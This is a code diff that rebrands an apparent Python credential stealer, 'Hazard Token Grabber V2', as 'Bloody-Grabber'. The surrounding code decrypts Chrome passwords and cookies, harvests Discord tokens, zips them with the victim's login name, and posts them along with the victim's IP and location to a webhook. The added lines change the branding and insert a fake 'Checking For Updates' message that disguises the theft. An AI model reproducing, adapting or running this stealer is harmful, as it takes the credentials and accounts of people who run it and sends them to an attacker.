@@ -8,6 +8,8 @@ import base64
 
 from re import findall
 
+print("Checking For Updates One Moment. . .")
+
 class Hazard_Token_Grabber_V2:
     def __init__(self):
         self.webhook = "WEBHOOK_HERE"
@@ -107,7 +109,7 @@ class Hazard_Token_Grabber_V2:
     def grabPassword(self):
         master_key = self.get_master_key()
         f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+        f.write("#Thank You For Using Bloody-Grabber | By Glosified \n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
             shutil.copy2(login_db, "Loginvault.db")
@@ -137,7 +139,7 @@ class Hazard_Token_Grabber_V2:
     def grabCookies(self):
         master_key = self.get_master_key()
         f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+        f.write("#Thank You For Using Bloody-Grabber | By Glosified \n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
         try:
             shutil.copy2(login_db, "Loginvault.db")
@@ -166,7 +168,7 @@ class Hazard_Token_Grabber_V2:
 
     def grabTokens(self):
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+        f.write("#Thank You For Using Bloody-Grabber | By Glosified \n\n")
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
@@ -264,7 +266,7 @@ class Hazard_Token_Grabber_V2:
         except:
             pass
         temp = os.path.join(self.tempfolder)
-        new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
+        new = os.path.join(self.appdata, f'Bloody-Grabber[{os.getlogin()}].zip')
         self.zip(temp, new)
         for dirname, _, files in os.walk(self.tempfolder):
             for f in files:
@@ -278,19 +280,19 @@ class Hazard_Token_Grabber_V2:
             "embeds": [
                 {
                     "author": {
-                        "name": "Hazard Token Grabber.V2",
-                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
-                        "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
+                        "name": "Bloody Token Grabber.V2",
+                        "url": "https://discord.gg/dWtASkxMTf",
+                        "icon_url": "https://i.pinimg.com/originals/e4/ee/3c/e4ee3c98ca208265da818f93a23814a9.gif"
                     },
-                    "description": f"**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
-                    "color": 16119101,
+                    "description": f"**{os.getlogin()}** Just ran Bloody Token Grabber.V2\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```",
+                    "color": 440000,
 
                     "thumbnail": {
                       "url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif"
                     },       
 
                     "footer": {
-                      "text": "©Rdimo#6969 https://github.com/Rdimo/Hazard-Token-Grabber-V2"
+                      "text": "Thank You For Using Bloody-Grabber As Your Client"
                     }
                 }
             ]
@@ -310,3 +312,5 @@ class Hazard_Token_Grabber_V2:
 
 if __name__ == "__main__":
     Hazard_Token_Grabber_V2()
+
+0
